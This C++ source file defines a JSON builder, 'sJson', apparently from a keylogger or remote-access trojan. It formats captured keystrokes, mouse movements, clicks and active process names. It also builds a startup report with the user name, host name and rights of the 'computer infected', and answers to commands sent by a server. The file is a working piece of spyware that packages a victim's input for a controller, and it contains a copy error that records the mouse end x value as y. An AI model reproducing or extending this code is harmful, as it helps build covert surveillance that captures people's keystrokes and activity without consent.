#include "sJson.h"

#include <sstream>

sJson::sJson()
{
	initBuffersEvent();
	initBufferActiveProcess();
}


sJson::~sJson()
{
	_buffer.clear();
	clearBuffers();
}

/* ++++ PUBLIC FUNCTION ++++ */

/* --- main JSON --- */

/*
** @fn		initBuffersEvent
** @brief	Put in JSON the begin of fonction
*/
void	sJson::initBufferActiveProcess()
{
	_buffer.append("{\"ActiveProcess\": [{");
}

/*
** @fn		initBuffersEvent
** @brief	Put in JSON the begin of fonction
*/
void	sJson::fillBufferActiveProcess()
{
	_buffer.append(_keyboard);
	_buffer.append("],");
	_buffer.append(_mouseMove);
	_buffer.append("],");
	_buffer.append(_mouseClick);
	_buffer.append("]}");
}

/*
** @fn		initBuffersEvent
** @brief	Put in JSON the begin of fonction
*/
std::string sJson::getBufferActiveProcessFull()
{
	std::string	buffer;
	fillBufferActiveProcess();
	_buffer.append("]}");
	buffer.append(_buffer);
	_buffer.clear();
	return buffer;
}

/*
** @fn		putActiveProcess
** @brief	Put in JSON path process use
** @param	path : path of process
** @param	pName : name of process
*/
void	sJson::putActiveProcess(std::string const & path, std::string const & pName)
{
	static int	i = 0;
	if (i > 0)
	{
		fillBufferActiveProcess();
		clearBuffers();
		_buffer.append(",{");
		initBuffersEvent();
	}
	fillJson(_buffer, path, "path");
	fillJson(_buffer, pName, "wName");
	i = 1;
}


/* --- */

/* --- JSON function event */

/*
** @fn		initBuffersEvent
** @brief	Put in JSON the begin of fonction
*/
void	sJson::initBuffersEvent()
{
	_firstKeyboard = 0;
	_firstMouseMove = 0;
	_firstMouseClick = 0;
	_keyboard.append("\"Keyboard\": [");
	_mouseMove.append("\"MouseMove\": [");
	_mouseClick.append("\"MouseClick\": [");
}

/*
** @fn		putKeyboard
** @brief	Put in JSON key push by user and add time begin, end.
** @param	key : key put by user.
** @param	begin : time of begin keyboard tapper
** @param	end : time of end keyboard tapper
*/
void	sJson::putKeyboard(std::string const & key, std::string const & begin, std::string const & end)
{
	if (_firstKeyboard > 0)
		_keyboard.append(",");
	_keyboard.append("{");
	fillJson(_keyboard, begin, "start");
	fillJson(_keyboard, end, "end");
	fillJson(_keyboard, key, "key", false);
	_keyboard.append("}");
	++_firstKeyboard;
}

/*
** @fn		putMouseMove
** @brief	Put in JSON information of mouse movement.
** @param	coordBeg : set coordinate where the mouse begin (x/y). exemple : "42/21"
** @param	coordEnd : set coordinate where the mouse finish (x/y). exemple : "42/21"
** @param	timeBeg : time of mouse move begin.
*/
void	sJson::putMouseMove(double begX, double begY, double endX, double endY, std::string const & timeBeg)
{
	if (_firstMouseMove > 0)
		_mouseMove.append(",");
	_mouseMove.append("{");
	fillJson(_mouseMove, timeBeg, "time");
	_mouseMove.append("\"start\" : {");
	fillJson(_mouseMove, begX, "x");
	fillJson(_mouseMove, begY, "y", false);
	_mouseMove.append("},");
	_mouseMove.append("\"end\" : {");
	fillJson(_mouseMove, endX, "x");
	fillJson(_mouseMove, endX, "y", false);
	_mouseMove.append("}}");
	++_firstMouseMove;
}

/*
** @fn		putMouseClick
** @brief	Put in JSON information about mouse click
** @param	coord : coordinate where a mouse click.
** @param	typeClick : put type of click left/right.
** @param	time : time of mouse click.
*/
void	sJson::putMouseClick(double coordX, double coordY, std::string const & typeClick, std::string const & time)
{
	if (_firstMouseClick > 0)
		_mouseClick.append(",");
	_mouseClick.append("{");
	fillJson(_mouseClick, time, "time");
	_mouseClick.append("\"click\" : {");
	fillJson(_mouseClick, coordX, "x");
	fillJson(_mouseClick, coordY, "y", false);
	_mouseClick.append("},");
	fillJson(_mouseClick, typeClick, "clickType", false);
	_mouseClick.append("}");
	++_firstMouseClick;
}

/* --- */

/* --- JSON alone --- */

/*
** @fn		putStartUp
** @brief	Put in JSON just for begin first message with simple information
** @param	userName : Name user of computer infected
** @param	hostName : Host of computer
** @param	userRight : Right of user, R (Read) W (Write) X (execute) S (Special permissions)
** @return	Buffer fill by informations.
*/
std::string	sJson::putStartUp(std::string const & userName,
	std::string const & hostName,
	std::string const & userRights)
{
	std::string start;

	start.assign("{\"StartUp\" : {");
	fillJson(start, userName, "uName");
	fillJson(start, hostName, "hName");
	fillJson(start, userRights, "uRights", false);
	start.append("}}");
	return start;
}

/*
** @fn		putAnswerCommand
** @brief	Put in JSON the answer of command by server.
** @param	cmd : command handling
** @param	ret : result of this command OK = 0, FAIL = -1;
** @param	time : time when the command was execute.
** @return	Buffer fill by informations.
*/
std::string	sJson::putAnswerCommand(std::string const & cmd, std::string const & ret, std::string const & time)
{
	std::string answer;
	answer.assign("{\"CmdOut\" : {");
	fillJson(answer, cmd, "cmd");
	fillJson(answer, time, "time");
	fillJson(answer, ret, "ret", false);
	answer.append("}}");
	return answer;
}

/* --- */

/* --- Function getter --- */

std::string const & sJson::getBuffer() const
{
	return _buffer;
}
std::string const & sJson::getKeyboard() const
{
	return _keyboard;
}
std::string const & sJson::getMouseMove() const
{
	return _mouseMove;
}
std::string const & sJson::getMouseClick() const
{
	return _mouseClick;
}

/* --- */

unsigned int sJson::getSizeBuffer() const
{
	return (int)_buffer.size();
}

/* ++++ PRIVATE FUNCTION ++++ */

/*
** @fn		clearBuffers
** @brief	clear Allf buffers but not the main buffer !
*/
void	sJson::clearBuffers()
{
	_keyboard.clear();
	_mouseMove.clear();
	_mouseClick.clear();
}

/* --- JSON function utility --- */

/*
** @fn		fillJson
** @brief	Put src in dest format JSON
** @param	dest : It is the destination of copy
** @param	src : It is the source of copy
** @param	title : Title of argument, for find in JSON
*/
void	sJson::fillJson(std::string & dest, std::string const & src, std::string const & title, bool check)
{
	dest.append("\"" + title + "\": \"" + src + "\"");
	if (check == true)
		dest.append(",");
}

/*
** @fn		fillJson
** @brief	Put src in dest format JSON
** @param	dest : It is the destination of copy
** @param	src : It is the source of copy
** @param	value : Title of argument, for find in JSON
*/
void	sJson::fillJson(std::string & dest, double value, std::string const & title, bool check)
{
	std::ostringstream strs;
	strs << value;
	dest.append("\"" + title + "\": " + strs.str());
	if (check == true)
		dest.append(",");
}

/* --- */